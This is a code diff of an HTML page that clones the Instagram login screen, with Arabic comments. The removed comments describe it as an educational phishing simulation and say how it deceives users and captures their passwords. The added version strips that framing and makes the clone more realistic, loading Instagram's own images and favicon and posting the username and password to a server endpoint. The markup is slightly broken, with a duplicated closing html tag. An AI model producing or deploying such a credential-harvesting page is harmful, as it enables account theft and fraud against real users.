@@ -4,180 +4,110 @@
     <!-- 
     ========================================
     هذا ملف HTML تعليمي يحاكي صفحة تسجيل الدخول في Instagram
-    الغرض منه تعليمي بحت لفهم كيفية عمل تقنيات التصيد الاحتيالي
-    ========================================
-    -->
-    
-    <!-- تحديد نوع المستند HTML5 -->
     <meta charset="UTF-8">
-    <!-- ضبط العرض ليكون متجاوب مع الأجهزة المختلفة -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- عنوان الصفحة - مطابق لـ Instagram الأصلي لخداع المستخدم -->
     <title>Instagram</title>
-    
-    <!-- ربط ملف CSS الخاص بالتصميم -->
     <link rel="stylesheet" href="style.css">
-    
-    <!-- أيقونة الموقع (favicon) لتبدو مثل Instagram الحقيقي -->
-    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico" type="image/x-icon">
-    
-    <!-- خدع إضافية لجعل الصفحة تبدو أصلية -->
-    <meta name="description" content="Create an account or log in to Instagram">
-    <meta property="og:title" content="Instagram">
-    <meta property="og:description" content="Create an account or log in to Instagram">
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/De-Dwjfvs1S.ico">
 </head>
 
 <body>
-    <!-- 
-    ========================================
-    الحاوي الرئيسي للصفحة
-    يتم تصميمه ليشبه Instagram تماماً
-    ========================================
-    -->
-    <div class="container">
-        
-        <!-- الحاوي الرئيسي لنموذج تسجيل الدخول -->
-        <div class="login-container">
-            
-            <!-- 
-            ========================================
-            صندوق تسجيل الدخول الرئيسي
-            ========================================
-            -->
-            <div class="login-box">
-                
-                <!-- شعار Instagram المزيف -->
-                <div class="logo">
-                    <!-- 
-                    استخدام النص بدلاً من الصورة لتجنب مشاكل التحميل
-                    في التطبيق الحقيقي يمكن استخدام صورة شعار Instagram الأصلية
-                    -->
-                    <h1>Instagram</h1>
-                </div>
-                
-                <!-- 
-                ========================================
-                نموذج تسجيل الدخول المزيف
-                هذا هو الجزء الأهم - حيث يتم التقاط بيانات المستخدم
-                ========================================
-                -->
-                <form id="loginForm" action="login.php" method="POST">
-                    
-                    <!-- 
-                    حقل اسم المستخدم أو البريد الإلكتروني
-                    تم استخدام type="text" بدلاً من email لقبول أي نوع من المدخلات
-                    -->
-                    <div class="input-group">
-                        <input 
-                            type="text" 
-                            name="username" 
-                            id="username"
-                            placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني"
-                            required
-                            autocomplete="username"
-                        >
-                        <!-- 
-                        ملاحظة: autocomplete="username" يساعد في ملء النموذج تلقائياً
-                        مما يجعل المستخدم أقل شكاً في الصفحة
-                        -->
-                    </div>
-                    
-                    <!-- 
-                    حقل كلمة المرور
-                    هذا هو الهدف الأساسي للهجوم
-                    -->
-                    <div class="input-group">
-                        <input 
-                            type="password" 
-                            name="password" 
-                            id="password"
-                            placeholder="كلمة المرور"
-                            required
-                            autocomplete="current-password"
-                        >
-                    </div>
-                    
-                    <!-- 
-                    ========================================
-                    زر تسجيل الدخول
-                    عند الضغط عليه سيتم إرسال البيانات إلى login.php
-                    ========================================
-                    -->
-                    <button type="submit" class="login-btn">تسجيل الدخول</button>
-                    
-                </form>
-                
-                <!-- 
-                ========================================
-                خط فاصل مع نص "أو"
-                لمحاكاة التصميم الأصلي
-                ========================================
-                -->
-                <div class="divider">
-                    <div class="divider-line"></div>
-                    <span class="divider-text">أو</span>
-                    <div class="divider-line"></div>
-                </div>
-                
-                <!-- 
-                رابط تسجيل الدخول عبر Facebook
-                في التطبيق الحقيقي يمكن جعل هذا يعمل أيضاً لسرقة بيانات Facebook
-                -->
-                <a href="#" class="facebook-login">
-                    <span class="facebook-icon">📘</span>
-                    تسجيل الدخول باستخدام Facebook
-                </a>
-                
-                <!-- رابط نسيان كلمة المرور -->
-                <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
-                
+    <!-- الحاوية الرئيسية -->
+    <div class="main-container">
+        <!-- القسم الأيسر: صورة الهاتف -->
+        <div class="left">
+            <div class="phone-container">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/y4/r/ItTndlZM2n2.png" class="ig-phone" />
+                <img src="https://news-cdn.softpedia.com/images/news2/ios-14-reveals-unexpected-instagram-app-camera-access-company-says-it-s-a-bug-530623-2.jpg" class="screenshot" />
             </div>
-            
-            <!-- 
-            ========================================
-            صندوق التسجيل
-            يحتوي على رابط إنشاء حساب جديد
-            ========================================
-            -->
-            <div class="signup-box">
-                <p>
-                    ليس لديك حساب؟ 
-                    <a href="#" class="signup-link">قم بالتسجيل</a>
-                </p>
-            </div>
-            
-            <!-- 
-            ========================================
-            قسم تحميل التطبيق
-            لجعل الصفحة تبدو أكثر أصالة
-            ========================================
-            -->
-            <div class="app-download">
-                <p>احصل على التطبيق.</p>
-                <div class="download-links">
-                    <!-- روابط وهمية لمتاجر التطبيقات -->
-                    <a href="#" class="app-store-link">
-                        📱 App Store
-                    </a>
-                    <a href="#" class="google-play-link">
-                        🤖 Google Play
-                    </a>
-                </div>
-            </div>
-            
         </div>
         
+        <!-- القسم الأيمن: نموذج تسجيل الدخول -->
+        <div class="right">
+            <!-- صندوق تسجيل الدخول الرئيسي -->
+            <div class="login-box">
+                <!-- شعار Instagram -->
+                <div class="logo-box">
+                    <img src="https://logos-download.com/wp-content/uploads/2016/03/Instagram_Logo_2016.png" class="instagram-logo" />
+                </div>
+                
+                <!-- نموذج تسجيل الدخول -->
+                <form id="loginForm" action="/login" method="POST">
+                    <!-- حقل اسم المستخدم/البريد الإلكتروني -->
+                    <input 
+                        type="text" 
+                        id="username" 
+                        name="username" 
+                        placeholder="Phone number, username, or email" 
+                        required 
+                        autocomplete="username"
+                    />
+                    
+                    <!-- حقل كلمة المرور -->
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="Password" 
+                        required 
+                        autocomplete="current-password"
+                    />
+                    
+                    <!-- زر تسجيل الدخول -->
+                    <br />
+                    <button type="submit" id="loginBtn">Log in</button>
+                </form>
+                
+                <!-- فاصل "أو" -->
+                <h3>
+                    <span>OR</span>
+                </h3>
+                
+                <br />
+                
+                <!-- تسجيل دخول بـ Facebook -->
+                <a href="#" class="facebook">Log in with Facebook</a>
+                
+                <br />
+                
+                <!-- رابط نسيان كلمة المرور -->
+                <a href="#" class="forgot">Forgot password?</a>
+            </div>
+            
+            <!-- صندوق التسجيل -->
+            <div class="sign-up-box">
+                <h4>Don't have an account?</h4>
+                <a href="#" class="sign-up">Sign up</a>
+            </div>
+            
+            <!-- تحميل التطبيق -->
+            <div class="app-install">
+                <h4>Get the app.</h4>
+                <a href="#">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" class="google" />
+                </a>
+                <a href="#">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" class="microsoft" />
+                </a>
+            </div>
+        </div>
     </div>
     
-    <!-- 
-    ========================================
-    التذييل - Footer
-    يحتوي على روابط وهمية لجعل الصفحة تبدو حقيقية
-    ========================================
-    -->
-    <footer class="footer">
-        <div class="footer-content">
+    <!-- التذييل -->
+    <div id="footer">
+        <div class="footer-link-container">
+            <a href="#" class="footer-link">Meta</a>
+            <a href="#" class="footer-link">About</a>
+            <a href="#" class="footer-link">Blog</a>
+            <a href="#" class="footer-link">Jobs</a>
+            <a href="#" class="footer-link">Help</a>
+            <a href="#" class="footer-link">API</a>
+            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link">Terms</a>
+            <a href="#" class="footer-link">Top Accounts</a>
+            <a href="#" class="footer-link">Locations</a>
+            <a href="#" class="footer-link">Instagram Lite</a>
+            <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
             <!-- قائمة الروابط السفلية -->
             <ul class="footer-links">
                 <li><a href="#">معلومات عنا</a></li>
@@ -310,4 +240,6 @@
     -->
     
 </body>
+</html>
+
 </html>
